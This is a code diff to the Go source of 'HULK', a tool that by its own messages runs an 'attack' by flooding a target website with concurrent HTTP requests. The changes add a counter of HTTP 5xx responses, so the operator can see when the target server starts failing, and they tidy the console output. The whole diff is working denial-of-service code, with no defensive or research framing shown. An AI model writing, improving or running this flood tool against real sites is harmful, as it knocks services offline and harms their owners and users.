@@ -33,6 +33,7 @@ const (
 	callExitOnErr
 	callExitOnTooManyFiles
 	targetComplete
+        callHttpStatus50x
 )
 
 // global params
@@ -99,7 +100,7 @@ func main() {
 
 	u, err := url.Parse(site)
 	if err != nil {
-		fmt.Println("err parsing url parameter\n")
+		fmt.Println("err parsing url parameter")
 		os.Exit(1)
 	}
 
@@ -124,18 +125,19 @@ func main() {
 	}
 
 	go func() {
-		fmt.Println("-- HULK Attack Started --\n           Go!\n\n")
+		fmt.Println("-- HULK Attack Started --\n           Go!")
+                fmt.Println()
 		ss := make(chan uint8, 8)
 		var (
-			err, sent int32
+			err, sent, status50x int32
 		)
-		fmt.Println("In use               |\tResp OK |\tGot err")
+		fmt.Println("In use               |\tResp OK |\tGot err|\tGot 50X")
 		for {
 			if atomic.LoadInt32(&cur) < int32(maxproc-1) {
 				go httpcall(site, u.Host, data, headers, ss)
 			}
 			if sent%10 == 0 {
-				fmt.Printf("\r%6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
+				fmt.Printf("\r%6d of max %-6d |\t%7d |\t%6d |\t%6d", cur, maxproc, sent, err, status50x)
 			}
 			switch <-ss {
 			case callExitOnErr:
@@ -148,9 +150,11 @@ func main() {
 				sent++
 			case targetComplete:
 				sent++
-				fmt.Printf("\r%-6d of max %-6d |\t%7d |\t%6d", cur, maxproc, sent, err)
-				fmt.Println("\r-- HULK Attack Finished --       \n\n\r")
+				fmt.Printf("\r%-6d of max %-6d |\t%7d |\t%6d |\t%6d", cur, maxproc, sent, err, status50x)
+				fmt.Println("-- HULK Attack Finished --       \n\n\r")
 				os.Exit(0)
+			case callHttpStatus50x:
+				status50x++
 			}
 		}
 	}()
@@ -158,7 +162,7 @@ func main() {
 	ctlc := make(chan os.Signal)
 	signal.Notify(ctlc, syscall.SIGINT, syscall.SIGKILL, syscall.SIGTERM)
 	<-ctlc
-	fmt.Println("\r\n-- Interrupted by user --        \n")
+	fmt.Println("\r\n-- Interrupted by user --")
 }
 
 func httpcall(url string, host string, data string, headers arrayFlags, s chan uint8) {
@@ -214,6 +218,9 @@ func httpcall(url string, host string, data string, headers arrayFlags, s chan u
 			return
 		}
 		r.Body.Close()
+		if r.StatusCode >= 500 {
+                    s <- callHttpStatus50x
+                }
 		s <- callGotOk
 		if safe {
 			if r.StatusCode >= 500 {
